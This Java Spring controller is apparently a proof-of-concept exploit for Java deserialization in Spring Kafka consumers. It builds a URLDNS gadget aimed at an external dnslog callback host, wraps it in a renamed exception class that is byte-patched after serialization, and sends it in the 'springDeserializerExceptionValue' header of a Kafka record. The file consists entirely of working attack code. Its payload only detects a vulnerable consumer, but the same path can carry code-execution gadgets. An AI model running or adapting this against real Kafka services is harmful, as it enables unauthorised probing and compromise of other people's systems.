package com.contrast.controller;

import org.apache.kafka.clients.producer.ProducerRecord;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

@RestController
public class Controller {

    @Autowired
    private KafkaTemplate<Object, Object> template;

    @GetMapping(path = "/send")
    public void send() throws Exception {
        ProducerRecord<Object, Object> producerRecord = new ProducerRecord<Object, Object>("myTopic", "key", null);
        producerRecord.headers().add("springDeserializerExceptionValue", getPOC());
        this.template.send(producerRecord);
    }

    public static byte[] getPOC() throws Exception {
        Object urldns = getURLDNS("wvagup.dnslog.cn");
        Object o = new xrg.springframework.kafka.support.serializer.DeserializationException(urldns);
        byte[] data = serialize(o);
        data[8] = "o".getBytes()[0];
        return data;
    }

    public static Object getURLDNS(final String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        URL u = new URL(null, url, handler);
        hashMap.put(u, url);
        Field hashcode = u.getClass().getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(u, -1);
        return hashMap;
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream= new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        return byteArrayOutputStream.toByteArray();
    }
}